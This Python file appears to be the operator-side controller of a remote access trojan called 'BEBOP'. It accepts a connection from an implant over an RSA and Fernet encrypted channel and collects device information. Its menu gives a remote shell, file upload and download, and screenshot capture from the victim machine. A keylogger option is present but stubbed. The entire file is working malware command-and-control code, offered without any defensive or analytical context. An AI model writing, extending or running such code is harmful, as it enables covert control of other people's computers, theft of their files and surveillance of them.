import base64
import socket
import sys
import time
import os
import base64
import rsa
from rsa import PublicKey
from cryptography.fernet import Fernet

address = ("0.0.0.0", 3000)
script_cwd = os.getcwd()
device_info = ""
authed = False


def print_menu():
    print("\n/-------BEBOP-------/\n")
    print("1.) Open shell")
    print("2.) Take screenshot")
    print("3.) Keylogger")
    print("4.) Exit\n\n")

def get_device_info():
    device_info = recv()
    return f"\n\n{device_info.decode()}\n\n"

def recv(buff_size=1024):
    data_buff = bytes()
    data_size = conn_to_client.recv(12)
    if len(data_size) > 0:
        data_size = int(data_size.decode().rstrip())
    else:
        return None

    while len(data_buff) < data_size:
        data_buff += conn_to_client.recv(buff_size)

    return decrypt(data_buff) if authed else data_buff

def send(data, header_size=12):
    if authed:
        data = encrypt(data)
    data_size = f"{len(data):<{header_size}}"
    conn_to_client.sendall(data_size.encode()+data)


def upload_file(file_name):
    try:
        with open(f"{file_name}", "rb") as file:
            file_data = file.read()
            send(file_data)


    except OSError as e:
        print(e)
        send(b'')

def download_file(file_name):
    file_data = recv(buff_size=32768)
    if not file_data:
        print("Could not download file...")
        return

    try:
        file = open(f"{file_name}", "wb")
        file.write(file_data)
        file.close()

    except OSError as e:
        print(e)


def open_shell():
    while True:
        cmd = ""
        try:
            cmd = input("bebop#: ")
        except KeyboardInterrupt:
            choice = input("\n\nQuit the program? Y or n: ")
            if choice.lower() == 'y' or choice.lower() == "yes":
                break

        if cmd:
            if cmd == "exit":
                send(cmd.encode())
                break

            elif cmd[:2] == "dw":
                #Download
                print("Downloading...")
                send(cmd.encode())

                file_name = cmd[3:]
                download_file(file_name)

            elif cmd[:2] == "up":
                #Upload
                print("Uploading...")
                send(cmd.encode())
                file_name = cmd[3:]
                upload_file(file_name)

            else:
                send(cmd.encode())
                output = recv()
                if output:
                    try:
                        output = output.decode() 

                    except:
                        print("Already in bytes")
            
                    finally:
                        print(output)

def encrypt(data):
    return lck.encrypt(data)

def decrypt(encrypted_data):
    return lck.decrypt(encrypted_data)

def establish_connection(address):
    global conn_to_client, authed, lck

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(address)
    server.listen(0)

    print("[+] Waiting on connections")
    while not authed: 
        conn_to_client, _ = server.accept()
        if conn_to_client:
            client_key_buff = recv()
            client_key = PublicKey.load_pkcs1(client_key_buff, 'PEM')
            
            key = Fernet.generate_key()
            send(rsa.encrypt(key, client_key))

            lck = Fernet(key)
            crypto = lck.decrypt(recv())
            if crypto == b"\n\nOK\n\n":
                authed = True
            else:
                kill_connection()

        else:
            kill_connection()
            sys.exit("[+] Failed to establish secure connection to client...")

def kill_connection():
    conn_to_client.shutdown(socket.SHUT_WR)
    conn_to_client.close()

def main():
    establish_connection(address)
    device_info = get_device_info()
    
    while conn_to_client:
        try:
            print(device_info)
            print_menu()
            choice = input("Enter Choice: ")
            send(choice.encode())

            if choice == "1":
                open_shell()

            elif choice == "2":
                print("\nTaking Screenshot...")
                download_file(file_name=f"{time.asctime()}.png")
                print(f"\nScreenshot saved in {script_cwd}/{time.asctime()}.png")

            elif choice == "3":
                pass

            elif choice == "4":
                keep_alive = input("[+] Keep client alive? (Y or N): ")
                print("[+] Keeping client alive..." if keep_alive.lower() == "y" or keep_alive == "yes" else "[+] Killing client connection...")
                send(keep_alive.encode())
                break

        except BrokenPipeError as bp:
            print("Connection lost...")
            print(bp)
            break

        except KeyboardInterrupt:
            choice = input("\n\nQuit the program? Y or n: ")
            if choice.lower() == 'y' or choice.lower() == "yes":
                break
            
        
    kill_connection()


main()
